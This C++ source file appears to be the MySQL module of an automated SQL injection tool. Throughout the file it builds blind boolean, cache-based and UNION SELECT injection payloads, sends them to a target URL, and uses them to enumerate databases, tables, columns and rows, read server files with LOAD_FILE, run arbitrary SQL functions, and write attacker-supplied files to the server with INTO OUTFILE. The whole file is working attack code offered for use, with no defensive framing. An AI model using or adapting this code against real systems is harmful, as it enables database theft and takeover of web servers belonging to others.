#include "Mysql.h"

Mysql::Mysql(Methods method, TCHAR *host, unsigned short port, TCHAR *path, TCHAR *rest)
{
    this->method = method;
    this->host = host;
    this->port = port;
    this->path = path;
    this->rest = rest;
    this->cache = 0;
#ifdef USE_PCRE_REGEX
    this->re = 0;
#else
    this->regexp = 0;
#endif
    this->requests_ = 0;

    this->set_space(_T("+"));		        // Space string in query - this could be %20
    this->set_table_quote_char(_T(""));     // Table quote char in query - this could be in hex
}

Mysql::~Mysql()
{
#ifdef USE_PCRE_REGEX
    if (this->re)
        delete[] this->re;       
#endif
    if (this->regexp)
        delete[] this->regexp;
}

bool Mysql::IsKnownDatabase(TCHAR *dbname) const
{
    if (!dbname)
        return false;

    // No need to find (information_schema info CAN'T be searched for info of itself)
    std::vector<TCHAR*> known_databases{ _T("information_schema"), _T("mysql"), _T("performance_schema") };

    for (auto database : known_databases)
    {
        if (!_tcscmp(dbname, database))
            return true;
    }
    return false;
}

TCHAR *Mysql::GetHttpData(TCHAR *query) const
{
    LOG(3, _T("[*] Attack URL: %s%s%s"), this->host, this->path, query, this->rest);

    size_t len = _tcslen(this->path) + _tcslen(query) + _tcslen(this->rest) + 1;
    TCHAR *qry = new TCHAR[len];
    memset(qry, 0, len * sizeof(TCHAR));
    _stprintf_s(qry, len, _T("%s%s%s"), this->path, query, this->rest);

    TCHAR *data = http->GetData(this->host, this->port, qry);
    delete[] qry;

    this->requests_++;

    return data;
}

long Mysql::SendQuery(TCHAR *query) const
{
    long ret = RESULT_NOT_FOUND;
    TCHAR *data = this->GetHttpData(query);
    if (data)
    {
        switch (this->method)
        {
            case kMethodBruteforce:
            {
#ifdef USE_PCRE_REGEX
                unsigned long len = _tcslen(data) + 1;
                char *tmp = new char[len];
                memset(tmp, 0, len * sizeof(char));
#if defined(UNICODE) || defined(_UNICODE)
                wcstombs_s(tmp, len, data, len - 1);
#else
                strcpy_s(tmp, len, data);
#endif
                int ovector[30] = { 0 };
                int rc = pcre_exec(re, 0, tmp, len - 1, 0, 0, ovector, 30);
                LOG(3, _T("[*] Found regex hit at offset %d"), ovector[0]);
                ret = (rc > 1 ? 1 : 0);
                delete[] tmp;
#else
                TCHAR *context = 0;
                TCHAR delims[] = _T(" \t\r\n");
                TCHAR *token = _tcstok_s(data, delims, &context);
                while (token)
                {
                    if (_tcsstr(token, this->regexp))
                    {
                        ret = 1;
                        break;
                    }
                    token = _tcstok_s(0, delims, &context);
                }
#endif
            }
            break;

            case kMethodCachingNumberic:
            case kMethodCachingStrings:
            {
                ret = this->cache->SearchCacheList(data);
            }
            break;
        }
        delete[] data;
    }
    return ret;
}

long Mysql::BruteforceQuery(TCHAR *sub_qry, unsigned short start, unsigned short end) const
{
    size_t size = 1024 + _tcslen(sub_qry) + _tcslen(this->space()) * 2 + 1;
    TCHAR *qry = new TCHAR[size];

    long result = 0;
    for (unsigned short i = start; (end > start ? i <= end : i >= end); (end > start ? i++ : i--))
    {
        memset(qry, 0, size * sizeof(TCHAR));
        _stprintf_s(qry, size, _T("%sAND(%s=%d)"), this->space(), sub_qry, i);
        LOG(2, _T("[*] Trying %d"), i);

        if (this->SendQuery(qry) != RESULT_NOT_FOUND)
        {
            delete[] qry;
            return i;
        }
    }
    delete[] qry;

    return RESULT_NOT_FOUND;
}

long Mysql::CacheQuery(TCHAR *qry, bool use_charset = false) const
{
    long result = RESULT_NOT_FOUND;
    unsigned long cache_count = 0;

    const PCacheList *cache_list = this->cache->GetCacheList(&cache_count);

    size_t len = 4024 * this->charlen + _tcslen(qry) + 1;
    TCHAR *tmp_qry = new TCHAR[len];

    for (unsigned long i = 0; i < this->charlen; i++)
    {
        size_t index = 0;
        memset(tmp_qry, 0, len * sizeof(TCHAR));

        if (use_charset)
            index += _stprintf_s(tmp_qry + index, len - index, _T("(SELECT(CASE(ASCII((%s)))"), qry);
        else
            index += _stprintf_s(tmp_qry + index, len - index, _T("(SELECT(CASE(ASCII((%s))-48)"), qry);

        for (unsigned long y = 0; y < cache_count && i < this->charlen; y++, i++)
        {
            cache_list[y]->chr = use_charset ? this->charset[i] : i;
            if (this->method == kMethodCachingNumberic)
            {
                unsigned long page = cache_list[y]->page;
                index += _stprintf_s(tmp_qry + index, len - index, _T("WHEN(0x%X)THEN(%d)"), use_charset ? this->charset[i] : i, page);
                if (use_charset && this->charset[i] >= _T('a') && this->charset[i] <= _T('z'))
                    index += _stprintf_s(tmp_qry + index, len - index, _T("WHEN(0x%X)THEN(%d)"), this->charset[i] - 32, page);
            }
            else
            {
                TCHAR *keyword = cache_list[y]->keyword;
                index += _stprintf_s(tmp_qry + index, len - index, _T("WHEN(0x%X)THEN(0x"), use_charset ? this->charset[i] : i);
                for (unsigned int z = 0; z < _tcslen(keyword); z++)
                    index += _stprintf_s(tmp_qry + index, len - index, _T("%X"), keyword[z]);

                index += _stprintf_s(tmp_qry + index, len - index, _T(")"));

                if (use_charset && this->charset[i] >= _T('a') && this->charset[i] <= _T('z'))
                {
                    index += _stprintf_s(tmp_qry + index, len - index, _T("WHEN(0x%X)THEN(0x"), this->charset[i] - 32);
                    for (unsigned int z = 0; z < _tcslen(keyword); z++)
                        index += _stprintf_s(tmp_qry + index, len - index, _T("%X"), keyword[z]);

                    index += _stprintf_s(tmp_qry + index, len - index, _T(")"));
                }
            }
        }
        index += _stprintf_s(tmp_qry + index, len - index, _T("END))"));
        i--;

        long chr = this->SendQuery(tmp_qry);
        if (chr != RESULT_NOT_FOUND)
        {
            result = chr;
            break;
        }
    }
    delete[] tmp_qry;

    return result;
}

TCHAR *Mysql::GetLengthBasedResult(TCHAR *qry, bool use_charset, unsigned short param1, unsigned short param2, bool count_length) const
{
    switch (this->method)
    {
        case kMethodBruteforce:
        {
            if (!use_charset)
            {
                long chr = this->GetCharResult(qry, false, param1, param2, true);
                TCHAR *dest = new TCHAR[5];
                memset(dest, 0, 5 * sizeof(TCHAR));
                _ltot_s(chr, dest, 5, 10);
                return dest;
            }

            unsigned long len = 4096 + _tcslen(qry), result_length = 1;
            TCHAR *tmp_qry = new TCHAR[len];
            memset(tmp_qry, 0, len * sizeof(TCHAR));
            
            // Get CHAR_LENGTH of the result
            _stprintf_s(tmp_qry, len, _T("IFNULL(CHAR_LENGTH((%s)),0)"), qry);
            result_length = this->GetCharResult(tmp_qry, false, param1, param2, true);
            
            TCHAR *result = new TCHAR[result_length + 1];
            memset(result, 0, (result_length + 1) * sizeof(TCHAR));
            for (unsigned long i = 0; i < result_length; i++)
            {
                memset(tmp_qry, 0, len * sizeof(TCHAR));
                _stprintf_s(tmp_qry, len, _T("SUBSTR(UPPER((%s)),%d,1)"), qry, i + 1);
                long chr = this->GetCharResult(tmp_qry, true, param1, param2);
                result[i] = (TCHAR)((chr == RESULT_NOT_FOUND) ? _T('?') : chr);
            }
            delete[] tmp_qry;

            return result;
        }
        break;

        case kMethodCachingNumberic:
        case kMethodCachingStrings:
        {
            long result_length = 0;

            unsigned long len = 4096 + _tcslen(qry);
            TCHAR *tmp_qry = new TCHAR[len];
            memset(tmp_qry, 0, len * sizeof(TCHAR));

            if (count_length)
            {
                // Get CHAR_LENGTH of the CHAR_LENGTH (inception...); ie. CHAR_LENGTH(CHAR_LENGTH('asdasdfsdfsdf sd') = 16) = 2
                _stprintf_s(tmp_qry, len, _T("CHAR_LENGTH(IFNULL(CHAR_LENGTH((%s)),0))"), qry);
                long length_length = this->GetCharResult(tmp_qry, false, param1, param2, false);

                if (length_length != RESULT_NOT_FOUND)
                {
                    // Get CHAR_LENGTH of the result; ie. CHAR_LENGTH('asdasdfsdfsdf sd') = 16
                    for (long i = 0; i < length_length; i++)
                    {
                        memset(tmp_qry, 0, len * sizeof(TCHAR));
                        _stprintf_s(tmp_qry, len, _T("SUBSTR(IFNULL(CHAR_LENGTH((%s)),0),%d,1)"), qry, i + 1);
                        result_length = result_length * 10 + this->GetCharResult(tmp_qry, false, param1, param2, false);
                    }
                }
                else
                {
                    result_length = RESULT_NOT_FOUND;
                }
            }
            else
            {
                // Get CHAR_LENGTH of the result
                _stprintf_s(tmp_qry, len, _T("IFNULL(CHAR_LENGTH((%s)),SPACE(0))"), qry);
                result_length = this->GetCharResult(tmp_qry, false, param1, param2, true);
            }

            // Get result
            if (result_length != RESULT_NOT_FOUND)
            {
                LOG(3, _T("[*] Found length of result: %d"), result_length);

                TCHAR *result = new TCHAR[result_length + 1];
                memset(result, 0, (result_length + 1) * sizeof(TCHAR));
                for (long i = 0; i < result_length; i++)
                {
                    memset(tmp_qry, 0, len * sizeof(TCHAR));
                    _stprintf_s(tmp_qry, len, _T("SUBSTR(LOWER((%s)),%d,1)"), qry, i + 1);
                    long chr = this->GetCharResult(tmp_qry, use_charset, param1, param2);
                    if (chr == RESULT_NOT_FOUND)
                        chr = _T('?');
                    else if (!use_charset)
                        chr += 0x30;

                    result[i] = (TCHAR)chr;
                }
                return result;
            }
            return 0;
        }
        break;

        case kMethodUnionSelect:
            return this->UnionSelectQuery(qry, use_charset, param1, param2);

        default:
            return 0;
    }
}

TCHAR *Mysql::UnionSelectQuery(TCHAR *query, bool use_charset, unsigned short param1, unsigned short param2) const
{
    TCHAR union_key = 0x01;

    // Create query
    size_t len = 4096 + _tcslen(query), paramkeylen = _tcslen(this->union_param_key);
    TCHAR *tmp_qry = new TCHAR[len];
    memset(tmp_qry, 0, len * sizeof(TCHAR));
    size_t index = _stprintf_s(tmp_qry, len, _T("CONCAT(0x%x,IFNULL((%s),SPACE(0)),0x%x)"), union_key, query, union_key);

    // Fix path
    size_t pathlen = _tcslen(this->path), tmplen = _tcslen(tmp_qry);
    len = pathlen + tmplen;
    TCHAR *tmp_path = new TCHAR[len];
    memset(tmp_path, 0, len * sizeof(TCHAR));

    size_t i = 0, j = 0, y = 0;
    for (; i < pathlen; i++)
    {
        y = 0;
        for (; y < paramkeylen; y++, i++)
        {
            if (this->path[i] != this->union_param_key[y])
                break;
        }

        if (y == paramkeylen)
            break;
        
        i -= y;
        tmp_path[j++] = this->path[i];
    }

    j += _stprintf_s(tmp_path + j, len - j, tmp_qry);
    j += _stprintf_s(tmp_path + j, len - j, this->path + i);

    TCHAR *old_path = this->path;
    this->path = tmp_path;

    TCHAR *data = GetHttpData(_T(""));
    delete[] tmp_path;
    this->path = old_path;

    if (!data)
        return 0;

    TCHAR *start_data = _tcschr(data, union_key);
    if (!start_data)
    {
        delete[] data;
        return 0;
    }
    TCHAR *end_data = _tcschr(++start_data, union_key);
    if (!end_data)
    {
        delete[] data;
        return _T("");
    }
    *end_data = '\0';

    len = _tcslen(start_data) + 1;
    TCHAR *buffer = new TCHAR[len];
    memset(buffer, 0, len * sizeof(TCHAR));
    memcpy(buffer, start_data, (len - 1) * sizeof(TCHAR));
    
    delete[] data;
    return buffer;
}

long Mysql::GetCharResult(TCHAR *qry, bool use_charset, unsigned short param1, unsigned short param2, bool brute_use_binary) const
{
    switch (this->method)
    {
        case kMethodBruteforce:
        {
            if (brute_use_binary)
            {
                size_t buflen = _tcslen(qry) + 1024;
                TCHAR *length_qry = new TCHAR[buflen];
                memset(length_qry, 0, buflen * sizeof(TCHAR));
                if (use_charset)
                    _stprintf_s(length_qry, buflen, _T("CHAR_LENGTH(CONV(ASCII((%s))-32,10,2))"), qry);
                else
                    _stprintf_s(length_qry, buflen, _T("CHAR_LENGTH(CONV((%s),10,2))"), qry);

                long len = this->BruteforceQuery(length_qry, param1 ? param1 : 7, param2 ? param2 : 1);

                if (len == RESULT_NOT_FOUND)
                    len = this->BruteforceQuery(length_qry, param1, param2 ? param2 : 1000);

                long result = 0;
                for (int i = 0; i < len; i++)
                {
                    memset(length_qry, 0, buflen * sizeof(TCHAR));
                    if (use_charset)
                        _stprintf_s(length_qry, buflen, _T("SUBSTR(CONV(ASCII((%s))-32,10,2),%d,1)"), qry, i + 1);
                    else
                        _stprintf_s(length_qry, buflen, _T("SUBSTR(CONV((%s),10,2),%d,1)"), qry, i + 1);

                    int res = this->BruteforceQuery(length_qry, 1, 1);
                    result = (result << 1) + (res == RESULT_NOT_FOUND ? 0 : 1);
                }
                delete[] length_qry;
                return (use_charset ? result + 32 : result);
            }
            return this->BruteforceQuery(qry, param1, (param2 ? param2 : 1000));
        }
        
        case kMethodCachingNumberic:
        case kMethodCachingStrings:
            return this->CacheQuery(qry, use_charset);

        case kMethodUnionSelect:
        {
            TCHAR *data = this->UnionSelectQuery(qry, use_charset, param1, param2);
            if (data)
            {
                TCHAR r = data[0];
                delete[] data;
                return r >= _T('0') && r <= _T('9') ? r - 0x30 : r;
            }
        }
        break;
    }
    return RESULT_NOT_FOUND;
}

std::map<TCHAR*, TCHAR*> Mysql::GetSetResult(TCHAR *dbname, TCHAR *tablename, std::vector<TCHAR*>& columnnames, long row) const
{
    size_t len = 1024;
    for (auto p : columnnames)
        len += _tcslen(p);

    len *= 2;

    const TCHAR key_column = 0x7F;

    TCHAR *qry = new TCHAR[len];
    memset(qry, 0, len * sizeof(TCHAR));
    size_t index = _stprintf_s(qry, len, _T("SELECT(CONCAT(SPACE(0)")), i = 0;
    if (columnnames.size())
    {
        for (auto columnname : columnnames)
            index += _stprintf_s(qry + index, len - index, _T(",CONCAT(0x%x,IFNULL(%s,SPACE(0)),0x%x)"), key_column, columnname, key_column);
    }
    index += _stprintf_s(qry + index, len - index, _T(",SPACE(0)))FROM(%s%s.%s%s)LIMIT%s%d,1"), this->table_quote_char(), dbname, tablename, this->table_quote_char(), this->space(), row - 1);

    TCHAR *data = this->GetLengthBasedResult(qry, true);
    delete[] qry;

    std::map<TCHAR*, TCHAR*> results;
    if (!data)
        return results;

    i = 0;
    TCHAR* start_column, *end_column;
    start_column = end_column = data;
    while (start_column = _tcschr(end_column, key_column))
    {
        start_column += 1;
        end_column = _tcschr(start_column, key_column);
        if (!end_column)
            break;
        
        *end_column = '\0';

        len = _tcslen(start_column) + 1;
        TCHAR *buffer = new TCHAR[len];
        memset(buffer, 0, len * sizeof(TCHAR));
        memcpy(buffer, start_column, (len - 1) * sizeof(TCHAR));

        results.insert(results.end(), std::pair<TCHAR*, TCHAR*>(columnnames.at(i++), buffer));
        end_column += 1;
    }
    delete[] data;
    return results;
}

long Mysql::GetDatabaseVersion() const
{
    size_t len = 1024 + _tcslen(this->space()) + 1;
    TCHAR *qry = new TCHAR[len];
    memset(qry, 0, len * sizeof(TCHAR));

    // Convert from INT to CHAR so that the ASCII() call later on will give back the correct number
    // We can't use the '+' character as that will be converted to a space; so we have to URLEncode it before sending
    //_stprintf_s(qry, len, _T("SUBSTR(version(),1,1)|0x30"));
    _stprintf_s(qry, len, _T("SUBSTR(version(),1,1)"));

    long result = this->GetCharResult(qry, false, 4, 6, false);
    return result;
}

long Mysql::GetDatabaseCount() const
{
    long count = RESULT_NOT_FOUND;
    size_t len = 1024 + _tcslen(this->space()) + 1;
    TCHAR *qry = new TCHAR[len];
    memset(qry, 0, len * sizeof(TCHAR));

    _stprintf_s(qry, len, _T("SELECT(COUNT(0))FROM(%sinformation_schema.SCHEMATA%s)"), this->table_quote_char(), this->table_quote_char());

    TCHAR *data = this->GetLengthBasedResult(qry);
    delete[] qry;

    if (data)
    {
        count = _ttol(data);
        delete[] data;
    }
    return count;
}

TCHAR *Mysql::GetDatabaseName(long id) const
{
    size_t len = 1024 + _tcslen(this->space()) + 1;
    TCHAR *qry = new TCHAR[len];
    memset(qry, 0, len * sizeof(TCHAR));

    _stprintf_s(qry, len, _T("SELECT(SCHEMA_NAME)FROM(%sinformation_schema.SCHEMATA%s)LIMIT%s%d,1"), this->table_quote_char(), this->table_quote_char(), this->space(), id - 1);

    TCHAR *dbname = this->GetLengthBasedResult(qry, true);
    delete[] qry;

    return dbname;
}

long Mysql::GetTableCount(TCHAR *dbname) const
{
    long count = RESULT_NOT_FOUND;
    size_t index = 0;
    size_t len = 1024 + _tcslen(this->space()) + 1;
    TCHAR *qry = new TCHAR[len];
    memset(qry, 0, len * sizeof(TCHAR));

    size_t dblen = _tcslen(dbname);
    if (dblen)
    {
        index += _stprintf_s(qry + index, len - index, _T("SELECT(COUNT(0))FROM(%sinformation_schema.TABLES%s)WHERE(TABLE_SCHEMA=0x"), this->table_quote_char(), this->table_quote_char());
    
        for (unsigned int i = 0; i < dblen; i++)
            index += _stprintf_s(qry + index, len - index, _T("%X"), dbname[i]);
        
        index += _stprintf_s(qry + index, len - index, _T(")AND(TABLE_ROWS%sIS%sNOT%sNULL)"), this->space(), this->space(), this->space());

        TCHAR *data = this->GetLengthBasedResult(qry);
        delete[] qry;

        if (data)
        {
            count = _ttol(data);
            delete[] data;
        }
    }
    return count;
}

TCHAR *Mysql::GetTableName(TCHAR *dbname, long id) const
{
    size_t index = 0;
    size_t len = 1024 + _tcslen(this->space()) + 1;
    TCHAR *qry = new TCHAR[len], *tablename = 0;
    memset(qry, 0, len * sizeof(TCHAR));

    size_t dblen = _tcslen(dbname);

    if (dblen)
    {
        index += _stprintf_s(qry + index, len - index, _T("SELECT(TABLE_NAME)FROM(%sinformation_schema.TABLES%s)WHERE(TABLE_SCHEMA=0x"), this->table_quote_char(), this->table_quote_char());
    
        for (unsigned int a = 0; a < dblen; a++)
            index += _stprintf_s(qry + index, len - index, _T("%X"), dbname[a]);

        index += _stprintf_s(qry + index, len - index, _T(")AND(TABLE_ROWS%sIS%sNOT%sNULL)LIMIT%s%d,1"), this->space(), this->space(), this->space(), this->space(), id - 1);

        tablename = this->GetLengthBasedResult(qry, true);
        delete[] qry;
    }
    return tablename;
}

long Mysql::GetColumnCount(TCHAR *dbname, TCHAR *tablename) const
{
    long count = RESULT_NOT_FOUND;
    size_t index = 0;
    size_t len = 1024 + _tcslen(this->space()) + 1;
    TCHAR *qry = new TCHAR[len];
    memset(qry, 0, len * sizeof(TCHAR));

    size_t dblen = _tcslen(dbname);
    size_t tablelen = _tcslen(tablename);

    if (dblen && tablelen)
    {
        index += _stprintf_s(qry + index, len - index, _T("SELECT(COUNT(0))FROM(%sinformation_schema.COLUMNS%s)WHERE(TABLE_SCHEMA=0x"), this->table_quote_char(), this->table_quote_char());
        for (unsigned int i = 0; i < dblen; i++)
            index += _stprintf_s(qry + index, len - index, _T("%X"), dbname[i]);

        index += _stprintf_s(qry + index, len - index, _T(")AND(TABLE_NAME=0x"), this->space(), this->space());

        for (unsigned int i = 0; i < tablelen; i++)
            index += _stprintf_s(qry + index, len - index, _T("%X"), tablename[i]);

        _stprintf_s(qry + index, len - index, _T(")"));
        TCHAR *data = this->GetLengthBasedResult(qry);
        delete[] qry;

        if (data)
        {
            count = _ttol(data);
            delete[] data;
        }
    }
    return count;
}

TCHAR *Mysql::GetColumnName(TCHAR *dbname, TCHAR *tablename, long id) const
{
    if (!dbname)
        return 0;

    if (!tablename)
        return 0;

    size_t index = 0;
    size_t len = 1024 + _tcslen(this->space()) + 1;
    TCHAR *qry = new TCHAR[len], *columnname = 0;
    memset(qry, 0, len * sizeof(TCHAR));

    size_t dblen = _tcslen(dbname), tablelen = _tcslen(tablename);
    if (dblen && tablelen)
    {
        index += _stprintf_s(qry + index, len - index, _T("SELECT(COLUMN_NAME)FROM(%sinformation_schema.COLUMNS%s)WHERE(TABLE_SCHEMA=0x"), this->table_quote_char(), this->table_quote_char());

        for (unsigned int a = 0; a < dblen; a++)
            index += _stprintf_s(qry + index, len - index, _T("%X"), dbname[a]);

        index += _stprintf_s(qry + index, len - index, _T(")AND(TABLE_NAME=0x"));

        for (unsigned int b = 0; b < tablelen; b++)
            index += _stprintf_s(qry + index, len - index, _T("%X"), tablename[b]);

        index += _stprintf_s(qry + index, len - index, _T(")LIMIT%s%d,1"), this->space(), id - 1);

        columnname = this->GetLengthBasedResult(qry, true);
    }
    delete[] qry;

    return columnname;
}

long Mysql::GetRowCount(TCHAR *dbname, TCHAR *tablename) const
{
    long count = RESULT_NOT_FOUND;
    size_t len = 1024 + _tcslen(this->space()) + 1;
    TCHAR *qry = new TCHAR[len];
    memset(qry, 0, len * sizeof(TCHAR));
    if (_tcslen(dbname) > 2)
        _stprintf_s(qry, len, _T("SELECT(COUNT(0))FROM(%s%s.%s%s)"), this->table_quote_char(), dbname, tablename, this->table_quote_char());
    else
        _stprintf_s(qry, len, _T("SELECT(COUNT(0))FROM(%s%s%s)"), this->table_quote_char(), tablename, this->table_quote_char());

    TCHAR *data = this->GetLengthBasedResult(qry, true);
    delete[] qry;

    if (data)
    {
        count = _ttol(data);
        delete[] data;
    }

    return count;
}

TCHAR *Mysql::GetRowData(TCHAR *dbname, TCHAR *tablename, TCHAR *columnname, long row) const
{
    size_t len = 1024 + _tcslen(this->space()) + 1;
    TCHAR *qry = new TCHAR[len];
    memset(qry, 0, len * sizeof(TCHAR));
    if (_tcslen(dbname) > 2)
        _stprintf_s(qry, len, _T("SELECT(%s)FROM(%s%s.%s%s)LIMIT%s%d,1"), columnname, this->table_quote_char(), dbname, tablename, this->table_quote_char(), this->space(), row - 1);
    else
        _stprintf_s(qry, len, _T("SELECT(%s)FROM(%s%s%s)LIMIT%s%d,1"), columnname, this->table_quote_char(), tablename, this->table_quote_char(), this->space(), row - 1);

    TCHAR *data = this->GetLengthBasedResult(qry, true);
    delete[] qry;

    return data;
}

std::map<TCHAR*, TCHAR*> Mysql::GetRowData(TCHAR *dbname, TCHAR *tablename, std::vector<TCHAR*>& columnnames, long row) const
{
    return this->GetSetResult(dbname, tablename, columnnames, row);
}

TCHAR *Mysql::GetCustomData(TCHAR *dbname, TCHAR *tablename, TCHAR *columnname, TCHAR *target, TCHAR *criteria) const
{
    size_t len = 1024 + _tcslen(this->space()) + 1;
    TCHAR *qry = new TCHAR[len];
    memset(qry, 0, len * sizeof(TCHAR));

    size_t index = 0;
    TCHAR *encoded = new TCHAR[len];
    memset(encoded, 0, len * sizeof(TCHAR));
    index += _stprintf_s(encoded + index, len - index, _T("0x"));

    size_t critlen = _tcslen(criteria);
    for (unsigned int a = 0; a < critlen; a++)
        index += _stprintf_s(encoded + index, len - index, _T("%X"), criteria[a]);
    
    if (_tcslen(dbname) > 2)
        _stprintf_s(qry, len, _T("SELECT(COUNT(0))FROM(%s%s.%s%s)WHERE(%s)LIKE(%s)"), this->table_quote_char(), dbname, tablename, this->table_quote_char(), target, encoded);
    else
        _stprintf_s(qry, len, _T("SELECT(COUNT(0))FROM(%s%s%s)WHERE(%s)LIKE(%s)"), this->table_quote_char(), tablename, this->table_quote_char(), target, encoded);

    TCHAR *result = this->GetLengthBasedResult(qry);
    if (result)
    {
        long rows = _ttol(result);
        delete[] result;

        long id = 1;
        if (rows > 1)
        {
            TCHAR tmp[32] = { 0 };
            while (true)
            {
                _tprintf(_T("Found %d rows - select row number: "), rows);
                _fgetts(tmp, sizeof(tmp), stdin);
                id = _ttoi(tmp);
                if ((id > rows) || (id < 1))
                    _tprintf(_T("Invalid row number - select between 1 and %d"), rows);
                else
                    break;
            }
        }
    
        if (_tcslen(dbname) > 2)
            _stprintf_s(qry, len, _T("SELECT(%s)FROM(%s%s.%s%s)WHERE(%s)LIKE(%s)"), columnname, this->table_quote_char(), dbname, tablename, this->table_quote_char(), target, encoded);
        else
            _stprintf_s(qry, len, _T("SELECT(%s)FROM(%s%s%s)WHERE(%s)LIKE(%s)"), columnname, this->table_quote_char(), tablename, this->table_quote_char(), target, encoded);

        delete[] encoded;

        result = this->GetLengthBasedResult(qry, true);
        delete[] qry;
    }
    return result;
}

TCHAR *Mysql::LoadFile(TCHAR *filepath) const
{
    if (!filepath)
        return 0;

    size_t filelen = _tcslen(filepath), buflen = filelen + 1024;
    TCHAR *qry = new TCHAR[buflen], *result = 0;
    memset(qry, 0, buflen * sizeof(TCHAR));

    if (filelen)
    {
        size_t index = _stprintf_s(qry, buflen, _T("LOAD_FILE(0x"));
        for (unsigned int b = 0; b < filelen; b++)
            index += _stprintf_s(qry + index, buflen - index, _T("%X"), filepath[b]);

        index += _stprintf_s(qry + index, buflen - index, _T(")"));

        result = this->GetLengthBasedResult(qry, true, 0, 0, true);
    }
    delete[] qry;

    return result;
}

TCHAR *Mysql::GetConfigValue(TCHAR *variable) const
{
    if (!variable)
        return 0;

    size_t len = _tcslen(variable) + 1024;
    TCHAR *qry = new TCHAR[len];
    memset(qry, 0, len * sizeof(TCHAR));

    size_t index = _stprintf_s(qry, len, _T("@@%s"), variable);

    TCHAR *result = this->GetLengthBasedResult(qry, true, 0, 0, true);
    delete[] qry;

    return result;
}

TCHAR *Mysql::ExecuteFunction(TCHAR *function) const
{
    if (!function)
        return 0;

    size_t len = _tcslen(function) + 1024;
    TCHAR *qry = new TCHAR[len];
    memset(qry, 0, len * sizeof(TCHAR));

    size_t index = _stprintf_s(qry, len, _T("%s"), function);

    TCHAR *result = this->GetLengthBasedResult(qry, true, 0, 0, true);
    delete[] qry;

    return result;
}

void Mysql::SaveFile(TCHAR *filepath, TCHAR *contents, size_t contents_size_bytes) const
{
    SaveFile(filepath, contents, contents_size_bytes, false);
}

void Mysql::SaveFile(TCHAR *filepath, TCHAR *contents, size_t contents_size_bytes, bool use_compression) const
{
    if (!filepath)
        return;

    size_t path_len = _tcslen(filepath);
    size_t buflen = (1024 + path_len), index = 0;
    size_t compressed_size = 0, uncompressed_size = contents_size_bytes;
    unsigned char *compressed_contents = 0;
    if (use_compression)
    {
        Strings strings;
        char *contents_char = strings.ConvertWideCharStringToChar(CP_ACP, contents, _tcslen(contents), &contents_size_bytes);

        compressed_contents = strings.Compress(reinterpret_cast<unsigned char*>(contents_char), contents_size_bytes, &compressed_size);
        delete[] contents_char;
        
        buflen += compressed_size;
    }
    else
    {
        buflen += contents_size_bytes;
    }

    // HEX encoding makes it twice as big
    buflen *= 2;

    TCHAR *qry = new TCHAR[buflen];
    memset(qry, 0, buflen * sizeof(TCHAR));
    if (use_compression)
        index += _stprintf_s(qry + index, buflen - index, _T("(UNCOMPRESS("));

    index += _stprintf_s(qry + index, buflen - index, _T("(0x"));

    if (use_compression)
    {
        index += _stprintf_s(qry + index, buflen - index, _T("%04X"), INT_REVERSE(uncompressed_size));
        for (unsigned int b = 0; b < compressed_size; b++)
            index += _stprintf_s(qry + index, buflen - index, _T("%02hX"), compressed_contents[b]);

        index += _stprintf_s(qry + index, buflen - index, _T("))"));
        delete[] compressed_contents;
    }
    else
    {
        for (unsigned int b = 0; b < contents_size_bytes; b++)
            index += _stprintf_s(qry + index, buflen - index, _T("%X"), contents[b]);
    }
    

    index += _stprintf_s(qry + index, buflen - index, _T(")INTO%sOUTFILE%s'%s"), this->space(), this->space(), filepath);

    // Fix path
    TCHAR *old_path = this->path;

    TCHAR *ptr = _tcsstr(this->path, this->union_param_key);
    if (!ptr)
    {
        
    }
    size_t length = ptr - this->path;

    size_t newpathlength = length + index + 1;
    TCHAR *newpath = new TCHAR[newpathlength];
    memset(newpath, 0, newpathlength * sizeof(TCHAR));
    memcpy(newpath, this->path, length * sizeof(TCHAR));
    _stprintf_s(newpath + length, newpathlength - length, _T("%s"), qry);

    this->path = newpath;

    TCHAR *data = GetHttpData(_T(""));
    delete[] newpath;

    this->path = old_path;
    delete[] data;
}

void Mysql::SetPath(TCHAR *path, TCHAR *rest)
{
    this->path = path;
    this->rest = rest;
}
